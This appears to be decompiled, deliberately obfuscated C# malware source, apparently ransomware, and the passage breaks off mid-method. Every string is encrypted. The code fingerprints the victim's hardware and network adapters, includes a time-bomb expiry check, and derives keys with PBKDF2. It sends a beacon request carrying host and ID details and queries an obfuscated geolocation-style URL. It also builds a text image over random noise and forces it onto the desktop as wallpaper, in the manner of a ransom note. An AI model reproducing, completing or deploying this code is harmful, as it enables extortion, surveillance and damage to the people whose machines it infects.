using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace RU;

internal class Class7
{
	private class Class8
	{
		private static string string_0;

		private const string string_1 = "hwid.cfg";

		public static string smethod_0()
		{
			if (File.Exists(Class22.smethod_0("\uf193\uf18c\uf192\uf19f\uf1d5\uf198\uf19d\uf19c", 61770)))
			{
				string_0 = File.ReadAllText(Class22.smethod_0("\uf193\uf18c\uf192\uf19f\uf1d5\uf198\uf19d\uf19c", 61770));
			}
			if (string.IsNullOrEmpty(string_0))
			{
				string_0 = smethod_1(Class22.smethod_0("\uf0fc\uf0ef\uf0ea\uf09f\uf081\uf081\uf09f", 61501) + smethod_5() + Class22.smethod_0("\uf89d\uf8d5\uf8de\uf8d8\uf8c4\uf8b7\uf8a9\uf8a9\uf8b7", 63511) + smethod_6() + Class22.smethod_0("\uebf3\uebbb\uebb8\uebaa\uebbc\uebd9\uebc7\uebc7\uebd9", 60377) + smethod_8() + Class22.smethod_0("\ue6a9\ue6e7\ue6ea\ue6f0\ue6e8\ue683\ue69d\ue69d\ue683", 59043) + smethod_7() + Class22.smethod_0("\ue3ac\ue3f0\ue3ef\ue3e2\ue3e3\ue3e9\ue386\ue398\ue398\ue386", 58276) + smethod_9() + Class22.smethod_0("\uf5f3\uf5b4\uf5b8\uf5ba\uf5d9\uf5c7\uf5c7\uf5d9", 62969) + smethod_10());
				File.WriteAllText(Class22.smethod_0("\uf193\uf18c\uf192\uf19f\uf1d5\uf198\uf19d\uf19c", 61770), string_0);
			}
			return string_0;
		}

		private static string smethod_1(string string_2)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(string_2);
			return smethod_2(mD5CryptoServiceProvider.ComputeHash(bytes));
		}

		private static string smethod_2(IList<byte> ilist_0)
		{
			string text = string.Empty;
			for (int i = 0; i < ilist_0.Count; i++)
			{
				byte num = ilist_0[i];
				int num2 = num & 0xF;
				int num3 = (num >> 4) & 0xF;
				text = ((num3 <= 9) ? (text + num3.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num3 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
				text = ((num2 <= 9) ? (text + num2.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
				if (i + 1 != ilist_0.Count && (i + 1) % 2 == 0)
				{
					text += Class22.smethod_0("\uecd2", 60543);
				}
			}
			return text;
		}

		private static string smethod_3(string string_2, string string_3, string string_4)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			string text = "";
			ManagementObjectEnumerator enumerator = new ManagementClass(string_2).GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					if (!(current.get_Item(string_4).ToString() != Class22.smethod_0("\uf268\uf24e\uf249\uf259", 61952)) && !(text != ""))
					{
						try
						{
							text = current.get_Item(string_3).ToString();
							return text;
						}
						catch
						{
						}
					}
				}
				return text;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}

		private static string smethod_4(string string_2, string string_3)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			string text = "";
			ManagementObjectEnumerator enumerator = new ManagementClass(string_2).GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					if (!(text != ""))
					{
						try
						{
							text = current.get_Item(string_3).ToString();
							return text;
						}
						catch
						{
						}
					}
				}
				return text;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}

		private static string smethod_5()
		{
			string text = smethod_4(Class22.smethod_0("\uecee\uecd0\uecd7\uec8a\uec8b\uece6\uece9\ueccb\uecd6\uecda\uecdc\uecca\uecca\uecd6\ueccb", 60585), Class22.smethod_0("\uedae\ued95\ued92\ued8a\ued8e\ued9e\uedb2\ued9f", 60906));
			if (text != "")
			{
				return text;
			}
			text = smethod_4(Class22.smethod_0("\uecee\uecd0\uecd7\uec8a\uec8b\uece6\uece9\ueccb\uecd6\uecda\uecdc\uecca\uecca\uecd6\ueccb", 60585), Class22.smethod_0("\uee27\uee05\uee18\uee14\uee12\uee04\uee04\uee18\uee05\uee3e\uee13", 60982));
			if (text != "")
			{
				return text;
			}
			text = smethod_4(Class22.smethod_0("\uecee\uecd0\uecd7\uec8a\uec8b\uece6\uece9\ueccb\uecd6\uecda\uecdc\uecca\uecca\uecd6\ueccb", 60585), Class22.smethod_0("\ue499\ue4b6\ue4ba\ue4b2", 58439));
			if (text == "")
			{
				text = smethod_4(Class22.smethod_0("\uecee\uecd0\uecd7\uec8a\uec8b\uece6\uece9\ueccb\uecd6\uecda\uecdc\uecca\uecca\uecd6\ueccb", 60585), Class22.smethod_0("\uf7b6\uf79a\uf795\uf78e\uf79d\uf79a\uf798\uf78f\uf78e\uf789\uf79e\uf789", 63450));
			}
			return text + smethod_4(Class22.smethod_0("\uecee\uecd0\uecd7\uec8a\uec8b\uece6\uece9\ueccb\uecd6\uecda\uecdc\uecca\uecca\uecd6\ueccb", 60585), Class22.smethod_0("\ue9be\ue992\ue98b\ue9b0\ue99f\ue99c\ue990\ue998\ue9a0\ue983\ue996\ue996\ue997", 59891));
		}

		private static string smethod_6()
		{
			return smethod_4(Class22.smethod_0("\uf8ae\uf890\uf897\uf8ca\uf8cb\uf8a6\uf8bb\uf8b0\uf8b6\uf8aa", 63737), Class22.smethod_0("\uf7b6\uf79a\uf795\uf78e\uf79d\uf79a\uf798\uf78f\uf78e\uf789\uf79e\uf789", 63450)) + smethod_4(Class22.smethod_0("\uf8ae\uf890\uf897\uf8ca\uf8cb\uf8a6\uf8bb\uf8b0\uf8b6\uf8aa", 63737), Class22.smethod_0("\uf38b\uf395\uf39a\uf391\uf397\uf38b\uf39a\uf391\uf397\uf38b\uf38e\uf3bd\uf3aa\uf3ab\uf3b1\uf3b7\uf3b6", 62424)) + smethod_4(Class22.smethod_0("\uf8ae\uf890\uf897\uf8ca\uf8cb\uf8a6\uf8bb\uf8b0\uf8b6\uf8aa", 63737), Class22.smethod_0("\ue21e\ue233\ue232\ue239\ue223\ue23e\ue231\ue23e\ue234\ue236\ue223\ue23e\ue238\ue239\ue214\ue238\ue233\ue232", 57942)) + smethod_4(Class22.smethod_0("\uf8ae\uf890\uf897\uf8ca\uf8cb\uf8a6\uf8bb\uf8b0\uf8b6\uf8aa", 63737), Class22.smethod_0("\ue7cc\ue7fa\ue7ed\ue7f6\ue7fe\ue7f3\ue7d1\ue7ea\ue7f2\ue7fd\ue7fa\ue7ed", 59293)) + smethod_4(Class22.smethod_0("\uf8ae\uf890\uf897\uf8ca\uf8cb\uf8a6\uf8bb\uf8b0\uf8b6\uf8aa", 63737), Class22.smethod_0("\ueef1\ueec6\ueecf\ueec6\ueec2\ueed0\ueec6\ueee7\ueec2\ueed7\ueec6", 61091)) + smethod_4(Class22.smethod_0("\uf8ae\uf890\uf897\uf8ca\uf8cb\uf8a6\uf8bb\uf8b0\uf8b6\uf8aa", 63737), Class22.smethod_0("\ue220\ue213\ue204\ue205\ue21f\ue219\ue218", 57972));
		}

		private static string smethod_7()
		{
			return smethod_4(Class22.smethod_0("\uefe0\uefde\uefd9\uef84\uef85\uefe8\ueff3\uefde\uefc4\uefdc\ueff3\uefc5\uefde\uefc1\uefd2", 61239), Class22.smethod_0("\uf332\uf310\uf31b\uf31a\uf313", 62334)) + smethod_4(Class22.smethod_0("\uefe0\uefde\uefd9\uef84\uef85\uefe8\ueff3\uefde\uefc4\uefdc\ueff3\uefc5\uefde\uefc1\uefd2", 61239), Class22.smethod_0("\uf7b6\uf79a\uf795\uf78e\uf79d\uf79a\uf798\uf78f\uf78e\uf789\uf79e\uf789", 63450)) + smethod_4(Class22.smethod_0("\uefe0\uefde\uefd9\uef84\uef85\uefe8\ueff3\uefde\uefc4\uefdc\ueff3\uefc5\uefde\uefc1\uefd2", 61239), Class22.smethod_0("\ue9e5\ue9df\ue9d1\ue9d8\ue9d7\ue9c2\ue9c3\ue9c4\ue9d3", 59828)) + smethod_4(Class22.smethod_0("\uefe0\uefde\uefd9\uef84\uef85\uefe8\ueff3\uefde\uefc4\uefdc\ueff3\uefc5\uefde\uefc1\uefd2", 61239), Class22.smethod_0("\ue0ab\ue090\ue08b\ue09e\ue093\ue0b7\ue09a\ue09e\ue09b\ue08c", 57535));
		}

		private static string smethod_8()
		{
			return smethod_4(Class22.smethod_0("\uedc0\uedfe\uedf9\ueda4\ueda5\uedc8\uedd5\uedf6\uede4\uedf2\uedd5\uedf8\uedf6\uede5\uedf3", 60679), Class22.smethod_0("\uf332\uf310\uf31b\uf31a\uf313", 62334)) + smethod_4(Class22.smethod_0("\uedc0\uedfe\uedf9\ueda4\ueda5\uedc8\uedd5\uedf6\uede4\uedf2\uedd5\uedf8\uedf6\uede5\uedf3", 60679), Class22.smethod_0("\uf7b6\uf79a\uf795\uf78e\uf79d\uf79a\uf798\uf78f\uf78e\uf789\uf79e\uf789", 63450)) + smethod_4(Class22.smethod_0("\uedc0\uedfe\uedf9\ueda4\ueda5\uedc8\uedd5\uedf6\uede4\uedf2\uedd5\uedf8\uedf6\uede5\uedf3", 60679), Class22.smethod_0("\ue499\ue4b6\ue4ba\ue4b2", 58439)) + smethod_4(Class22.smethod_0("\uedc0\uedfe\uedf9\ueda4\ueda5\uedc8\uedd5\uedf6\uede4\uedf2\uedd5\uedf8\uedf6\uede5\uedf3", 60679), Class22.smethod_0("\ue7cc\ue7fa\ue7ed\ue7f6\ue7fe\ue7f3\ue7d1\ue7ea\ue7f2\ue7fd\ue7fa\ue7ed", 59293));
		}

		private static string smethod_9()
		{
			return smethod_4(Class22.smethod_0("\ue9a8\ue996\ue991\ue9cc\ue9cd\ue9a0\ue9a9\ue996\ue99b\ue99a\ue990\ue9bc\ue990\ue991\ue98b\ue98d\ue990\ue993\ue993\ue99a\ue98d", 59759), Class22.smethod_0("\uf783\uf7b5\uf7ae\uf7b1\uf7a2\uf7b5\uf791\uf7a2\uf7b5\uf7b4\uf7ae\uf7a8\uf7a9", 63430)) + smethod_4(Class22.smethod_0("\ue9a8\ue996\ue991\ue9cc\ue9cd\ue9a0\ue9a9\ue996\ue99b\ue99a\ue990\ue9bc\ue990\ue991\ue98b\ue98d\ue990\ue993\ue993\ue99a\ue98d", 59759), Class22.smethod_0("\ue499\ue4b6\ue4ba\ue4b2", 58439));
		}

		private static string smethod_10()
		{
			return smethod_3(Class22.smethod_0("\uf5c8\uf5f6\uf5f1\uf5ac\uf5ad\uf5c0\uf5d1\uf5fa\uf5eb\uf5e8\uf5f0\uf5ed\uf5f4\uf5de\uf5fb\uf5fe\uf5ef\uf5eb\uf5fa\uf5ed\uf5dc\uf5f0\uf5f1\uf5f9\uf5f6\uf5f8\uf5ea\uf5ed\uf5fe\uf5eb\uf5f6\uf5f0\uf5f1", 62877), Class22.smethod_0("\uee0a\uee06\uee04\uee06\uee23\uee23\uee35\uee22\uee34\uee34", 60934), Class22.smethod_0("\ue975\ue96c\ue979\ue952\ue95d\ue95e\ue950\ue959\ue958", 59664));
		}

		static Class8()
		{
			if (DateTime.Now > new DateTime(636769795143665500L))
			{
				throw new Exception();
			}
			string_0 = string.Empty;
		}
	}

	public class Class9
	{
		[CompilerGenerated]
		private string string_0;

		[CompilerGenerated]
		private int int_0;

		[CompilerGenerated]
		private int int_1;

		[CompilerGenerated]
		private int int_2;

		public string String_0
		{
			[CompilerGenerated]
			get
			{
				return string_0;
			}
			[CompilerGenerated]
			set
			{
				string_0 = value;
			}
		}

		public string String_1 => Class22.smethod_0("\ue212\ue236\ue23c\ue22d\ue230\ue22c\ue230\ue239\ue22b\ue27f", 57950) + String_0 + Class22.smethod_0("\uf51f\uf564\uf569\uf55a\uf54d\uf54c\uf556\uf550\uf551\uf51f", 62738) + Int32_1 + Class22.smethod_0("\uf7d1", 63484) + Int32_0 + Class22.smethod_0("\uf7d1", 63484) + Int32_2 + Class22.smethod_0("\ueae2\uea92", 60094) + smethod_1();

		public int Int32_0
		{
			[CompilerGenerated]
			get
			{
				return int_0;
			}
			[CompilerGenerated]
			set
			{
				int_0 = value;
			}
		}

		public int Int32_1
		{
			[CompilerGenerated]
			get
			{
				return int_1;
			}
			[CompilerGenerated]
			set
			{
				int_1 = value;
			}
		}

		public int Int32_2
		{
			[CompilerGenerated]
			get
			{
				return int_2;
			}
			[CompilerGenerated]
			set
			{
				int_2 = value;
			}
		}

		private Class9()
		{
		}

		public static Class9 smethod_0()
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return new Class9
			{
				String_0 = smethod_2(oSVersion),
				Int32_1 = oSVersion.Version.Major,
				Int32_0 = oSVersion.Version.Minor,
				Int32_2 = oSVersion.Version.Build
			};
		}

		private static string smethod_1()
		{
			if (IntPtr.Size == 8)
			{
				return Class22.smethod_0("\ue1f3\ue1f1\ue187\ue18c\ue191", 57793);
			}
			return Class22.smethod_0("\ue884\ue885\ue8f5\ue8fe\ue8e3", 59557);
		}

		private static string smethod_2(OperatingSystem operatingSystem_0)
		{
			string result = Class22.smethod_0("\ue9e2\ue9f9\ue9fc\ue9f9\ue9f8\ue9e0\ue9f9", 59799);
			switch (operatingSystem_0.Platform)
			{
			case PlatformID.Win32NT:
				result = smethod_4(operatingSystem_0);
				break;
			case PlatformID.Win32Windows:
				result = smethod_3(operatingSystem_0);
				break;
			}
			return result;
		}

		private static string smethod_3(OperatingSystem operatingSystem_0)
		{
			string result = Class22.smethod_0("\uf1a3\uf198\uf19d\uf198\uf199\uf181\uf198", 61908);
			switch (operatingSystem_0.Version.Minor)
			{
			case 90:
				result = Class22.smethod_0("\uf3a8\uf396\uf391\uf39b\uf390\uf388\uf38c\uf3df\uf3b2\uf39a", 62460);
				break;
			case 10:
			{
				string text = operatingSystem_0.Version.Revision.ToString();
				result = ((!(text == Class22.smethod_0("\ue5cd\ue5cd\ue5cd\ue5cd\ue5be", 58751))) ? Class22.smethod_0("\ue8ac\ue892\ue895\ue89f\ue894\ue88c\ue888\ue8db\ue8c2\ue8c3", 59402) : Class22.smethod_0("\uead2\ueaec\ueaeb\ueae1\ueaea\ueaf2\ueaf6\ueaa5\ueabc\ueabd\ueaa5\uead6\ueae0\ueae6\ueaea\ueaeb\ueae1\ueaa5\ueac0\ueae1\ueaec\ueaf1\ueaec\ueaea\ueaeb", 59905));
				break;
			}
			case 0:
				result = Class22.smethod_0("\ue238\ue206\ue201\ue20b\ue200\ue218\ue21c\ue24f\ue256\ue25a", 57954);
				break;
			}
			return result;
		}

		private static string smethod_4(OperatingSystem operatingSystem_0)
		{
			string result = Class22.smethod_0("\uf1a3\uf198\uf19d\uf198\uf199\uf181\uf198", 61908);
			switch (operatingSystem_0.Version.Major)
			{
			case 3:
				result = Class22.smethod_0("\uf8ac\uf892\uf895\uf89f\uf894\uf88c\uf888\uf8db\uf8b5\uf8af\uf8db\uf8c8\uf8d5\uf8ce\uf8ca", 63578);
				break;
			case 4:
				result = Class22.smethod_0("\uf5ac\uf592\uf595\uf59f\uf594\uf58c\uf588\uf5db\uf5b5\uf5af\uf5db\uf5cf\uf5d5\uf5cb", 62858);
				break;
			case 5:
				switch (operatingSystem_0.Version.Minor)
				{
				case 0:
					result = Class22.smethod_0("\ue408\ue436\ue431\ue43b\ue430\ue428\ue42c\ue47f\ue46d\ue46f\ue46f\ue46f", 58462);
					break;
				case 1:
					result = Class22.smethod_0("\uf821\uf81f\uf818\uf812\uf819\uf801\uf805\uf856\uf82e\uf826", 63604);
					break;
				case 2:
					result = Class22.smethod_0("\uf3f4\uf3ca\uf3cd\uf3c7\uf3cc\uf3d4\uf3d0\uf383\uf391\uf393\uf393\uf390", 62371);
					break;
				}
				break;
			case 6:
				switch (operatingSystem_0.Version.Minor)
				{
				case 0:
					result = Class22.smethod_0("\uf1e8\uf1d6\uf1d1\uf1db\uf1d0\uf1c8\uf1cc\uf19f\uf1e9\uf1d6\uf1cc\uf1cb\uf1de", 61851);
					break;
				case 1:
					result = Class22.smethod_0("\ued10\ued2e\ued29\ued23\ued28\ued30\ued34\ued67\ued70", 60742);
					break;
				case 2:
					result = Class22.smethod_0("\uf4a0\uf49e\uf499\uf493\uf498\uf480\uf484\uf4d7\uf4cf", 62695);
					break;
				case 3:
					result = Class22.smethod_0("\uf4ac\uf492\uf495\uf49f\uf494\uf48c\uf488\uf4db\uf4c3\uf4d5\uf4ca", 62490);
					break;
				}
				break;
			case 10:
				result = Class22.smethod_0("\uf3ae\uf390\uf397\uf39d\uf396\uf38e\uf38a\uf3d9\uf3c8\uf3c9", 62457);
				break;
			}
			return result;
		}
	}

	public static class Class10
	{
		private enum Enum0
		{
			const_0 = 117,
			const_1
		}

		[DllImport("gdi32.dll")]
		private static extern int GetDeviceCaps(IntPtr intptr_0, int int_0);

		public static Size smethod_0()
		{
			IntPtr hdc = Graphics.FromHwnd(IntPtr.Zero).GetHdc();
			return new Size(height: GetDeviceCaps(hdc, 117), width: GetDeviceCaps(hdc, 118));
		}

		public static Bitmap smethod_1(Image image_0, int int_0, int int_1)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Expected O, but got Unknown
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0055: Expected O, but got Unknown
			Rectangle rectangle = new Rectangle(0, 0, int_0, int_1);
			Bitmap val = new Bitmap(int_0, int_1);
			val.SetResolution(image_0.get_HorizontalResolution(), image_0.get_VerticalResolution());
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.set_CompositingMode((CompositingMode)1);
				val2.set_CompositingQuality((CompositingQuality)2);
				val2.set_InterpolationMode((InterpolationMode)7);
				val2.set_SmoothingMode((SmoothingMode)2);
				val2.set_PixelOffsetMode((PixelOffsetMode)2);
				ImageAttributes val3 = new ImageAttributes();
				try
				{
					val3.SetWrapMode((WrapMode)3);
					val2.DrawImage(image_0, rectangle, 0, 0, image_0.get_Width(), image_0.get_Height(), (GraphicsUnit)2, val3);
					return val;
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}

		public static Image smethod_2(string string_0, Color color_0, int int_0)
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Expected O, but got Unknown
			//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cc: Expected O, but got Unknown
			//IL_019e: Unknown result type (might be due to invalid IL or missing references)
			//IL_01a5: Expected O, but got Unknown
			//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
			//IL_01ce: Expected O, but got Unknown
			try
			{
				Size size = smethod_0();
				int width = size.Width;
				int height = size.Height;
				Bitmap val = new Bitmap(width, height);
				Random random = new Random();
				for (int i = 0; i < height; i++)
				{
					for (int j = 0; j < width; j++)
					{
						int alpha = random.Next(128, 256);
						int red = random.Next(128, 256);
						int green = random.Next(128, 256);
						int blue = random.Next(128, 256);
						val.SetPixel(j, i, Color.FromArgb(alpha, red, green, blue));
					}
				}
				Image val2 = (Image)(object)val;
				Graphics val3 = Graphics.FromImage(val2);
				Font val4 = new Font(Class22.smethod_0("\uf7b2\uf78f\uf78b\uf783\uf795\uf7c6\uf7a8\uf783\uf791\uf7c6\uf7b4\uf789\uf78b\uf787\uf788", 63460), (float)int_0);
				string[] array = string_0.Split(new string[3]
				{
					Class22.smethod_0("\ue4a2\ue4a5", 58507),
					Class22.smethod_0("\uf5f2", 62972),
					Class22.smethod_0("\uf2f1", 62170)
				}, StringSplitOptions.None);
				int num = size.Height / 10;
				string[] array2 = array;
				foreach (string text in array2)
				{
					_ = size.Width;
					_ = size.Height;
					num += size.Height / 20;
					PointF pointF = new PointF(size.Height / 2 + size.Width / 50, num);
					SizeF sizeF = val3.MeasureString(text, val4);
					new RectangleF(pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
					Brush val5 = (Brush)new SolidBrush(Color.White);
					val3.FillRectangle((Brush)new SolidBrush(color_0), pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
					val3.DrawString(text, val4, val5, pointF);
				}
				return val2;
			}
			catch (Exception)
			{
			}
			return null;
		}
	}

	public static class Class11
	{
		public enum Enum1
		{
			const_0,
			const_1,
			const_2
		}

		private const uint uint_0 = 20u;

		private const uint uint_1 = 1u;

		private const uint uint_2 = 2u;

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int SystemParametersInfo(uint uint_3, uint uint_4, string string_0, uint uint_5);

		public static void smethod_0(Image image_0, Enum1 enum1_0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class22.smethod_0("\uf775\uf759\uf758\uf742\uf744\uf759\uf75a\uf716\uf766\uf757\uf758\uf753\uf75a\uf76a\uf772\uf753\uf745\uf75d\uf742\uf759\uf746", 63284), writable: true);
			switch (enum1_0)
			{
			case Enum1.const_0:
				registryKey.SetValue(Class22.smethod_0("\uede0\uedd6\ueddb\ueddb\uedc7\uedd6\uedc7\uedd2\uedc5\uede4\uedc3\uedce\ueddb\uedd2", 60677), Class22.smethod_0("\ue7ce", 59260));
				registryKey.SetValue(Class22.smethod_0("\ue26b\ue256\ue253\ue25a\ue268\ue25e\ue253\ue253\ue24f\ue25e\ue24f\ue25a\ue24d", 57874), Class22.smethod_0("\ue7ce", 59260));
				break;
			case Enum1.const_1:
				registryKey.SetValue(Class22.smethod_0("\uede0\uedd6\ueddb\ueddb\uedc7\uedd6\uedc7\uedd2\uedc5\uede4\uedc3\uedce\ueddb\uedd2", 60677), Class22.smethod_0("\ue7ce", 59260));
				registryKey.SetValue(Class22.smethod_0("\ue26b\ue256\ue253\ue25a\ue268\ue25e\ue253\ue253\ue24f\ue25e\ue24f\ue25a\ue24d", 57874), Class22.smethod_0("\ue587", 58629));
				break;
			case Enum1.const_2:
				registryKey.SetValue(Class22.smethod_0("\uede0\uedd6\ueddb\ueddb\uedc7\uedd6\uedc7\uedd2\uedc5\uede4\uedc3\uedce\ueddb\uedd2", 60677), Class22.smethod_0("\uf1ed", 61788));
				registryKey.SetValue(Class22.smethod_0("\ue26b\ue256\ue253\ue25a\ue268\ue25e\ue253\ue253\ue24f\ue25e\ue24f\ue25a\ue24d", 57874), Class22.smethod_0("\ue587", 58629));
				break;
			}
			string text = Path.Combine(Path.GetTempPath(), Class22.smethod_0("\uf5c8\uf5de\uf5d3\uf5d3\uf5cf\uf5de\uf5cf\uf5da\uf5cd\uf591\uf5dd\uf5d2\uf5cf", 62909));
			image_0.Save(text, ImageFormat.get_Bmp());
			SystemParametersInfo(20u, 0u, text, 3u);
		}
	}

	[CompilerGenerated]
	private sealed class Class12
	{
		public string string_0;

		internal byte method_0(int int_0)
		{
			return Convert.ToByte(string_0.Substring(int_0, 2), 16);
		}
	}

	[CompilerGenerated]
	private sealed class Class13
	{
		public Random random_0;

		internal char method_0(string string_0)
		{
			return string_0[random_0.Next(string_0.Length)];
		}
	}

	[CompilerGenerated]
	private sealed class Class14
	{
		public Random random_0;

		internal char method_0(char char_0)
		{
			if (random_0.Next() % 2 != 0)
			{
				return char_0;
			}
			if (!char.IsUpper(char_0))
			{
				return char_0.ToString().ToUpper().First();
			}
			return char_0.ToString().ToLower().First();
		}
	}

	public static string smethod_0(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	public static string smethod_1(string string_0)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
	}

	public static string smethod_2(byte[] byte_0)
	{
		char[] array = new char[byte_0.Length * 2];
		int num = 0;
		int num2 = 0;
		while (num < byte_0.Length)
		{
			byte b = (byte)(byte_0[num] >> 4);
			array[num2] = (char)((b > 9) ? (b + 55 + 32) : (b + 48));
			b = (byte)(byte_0[num] & 0xFu);
			array[++num2] = (char)((b > 9) ? (b + 55 + 32) : (b + 48));
			num++;
			num2++;
		}
		return new string(array);
	}

	public static int smethod_3(string string_0)
	{
		try
		{
			return Convert.ToInt32(string_0, 16);
		}
		catch (Exception)
		{
			return -1;
		}
	}

	public static string smethod_4(int int_0)
	{
		try
		{
			return string.Format(Class22.smethod_0("\uf5c3\uf588\uf582\uf5c0\uf5c5", 62760), int_0);
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] smethod_5(string string_0)
	{
		try
		{
			return (from int_0 in Enumerable.Range(0, string_0.Length)
				where int_0 % 2 == 0
				select Convert.ToByte(string_0.Substring(int_0, 2), 16)).ToArray();
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] smethod_6(byte[] byte_0, byte[] byte_1, int int_0, int int_1)
	{
		try
		{
			return new Rfc2898DeriveBytes(byte_0, byte_1, int_0).GetBytes(int_1);
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] smethod_7(params byte[][] byte_0)
	{
		byte[] array = new byte[byte_0.Sum((byte[] byte_0) => byte_0.Length)];
		int num = 0;
		foreach (byte[] array2 in byte_0)
		{
			Buffer.BlockCopy(array2, 0, array, num, array2.Length);
			num += array2.Length;
		}
		return array;
	}

	public static void smethod_8(string string_0 = "", string string_1 = "")
	{
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(string_1);
			obj.Timeout = 10000;
			obj.AllowAutoRedirect = true;
			obj.UserAgent = GClass2.GClass3.GClass4.String_2;
			obj.Referer = string.Format(Class22.smethod_0("\ue2c7\ue28c\ue2c1\ue291\ue2c7\ue28d\ue2c1\ue286\ue2c7\ue28e\ue2c1", 57984), Class2.Class3.String_6, Class2.Class3.Int32_3, string_0);
			HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
			new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_9()
	{
		string text = "";
		int num = 0;
		do
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(Class22.smethod_0("\ue991\ue98d\ue98d\ue989\ue98a\ue9c3\ue9d6\ue9d6\ue990\ue989\ue990\ue997\ue99f\ue996\ue9d7\ue990\ue996\ue9d6\ue993\ue98a\ue996\ue997", 59897));
				obj.Timeout = 10000;
				obj.UserAgent = Class22.smethod_0("\uee98\ueeba\ueeaf\ueebc\ueeb9\ueeb9\ueeb4\ueefa\ueee0\ueefb\ueee5\ueef5\ueefd\uee82\ueebc\ueebb\ueeb1\ueeba\ueea2\ueea6\ueef5\uee9b\uee81\ueef5\ueee3\ueefb\ueee4\ueeee\ueef5\uee82\uee9a\uee82\ueee3\ueee1\ueeee\ueef5\uee81\ueea7\ueebc\ueeb1\ueeb0\ueebb\ueea1\ueefa\ueee2\ueefb\ueee5\ueeee\ueef5\uee94\uee86\ueeee\ueef5\ueea7\ueea3\ueeef\ueee4\ueee4\ueefb\ueee5\ueefc\ueef5\ueeb9\ueebc\ueebe\ueeb0\ueef5\uee92\ueeb0\ueeb6\ueebe\ueeba", 61137);
				HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
				text = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
			}
			catch (Exception)
			{
			}
			num++;
			if (string.IsNullOrEmpty(text) && num >= 3)
			{
				return null;
			}
		}
		while (string.IsNullOrEmpty(text));
		return Regex.Split(text, Class22.smethod_0("\uf8dd\uf896\uf88f\uf8dd\uf8c5\uf8df\uf8dd", 63503))[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, Class22.smethod_0("\ue21e\ue253\ue24e\ue25b\ue21e\ue206\ue21c\ue21e", 57872))[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, Class22.smethod_0("\ue001\ue040\ue04a\ue057\ue05a\ue001\ue019\ue003\ue001", 57347))[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, Class22.smethod_0("\uec95\uecd4\uecd8\uecc2\uecd9\uecc3\uecc5\uecce\uec95\uec8d\uec97\uec95", 60471))[1].Split(new char[1] { '"' })[0];
	}

	public static string smethod_10()
	{
		string empty = string.Empty;
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					empty += networkInterface.GetPhysicalAddress().ToString();
					string[] array = new string[empty.Length];
					for (int j = 0; j < empty.Length; j++)
					{
						array[j] = Encoding.UTF8.GetBytes(empty)[j].ToString(Class22.smethod_0("\ue0af\ue0e5", 57494));
					}
					return string.Join(Class22.smethod_0("\ue94c", 59764), array);
				}
			}
			return empty;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string smethod_11(int int_0, bool bool_0 = false)
	{
		Random random_0 = new Random();
		string text = "";
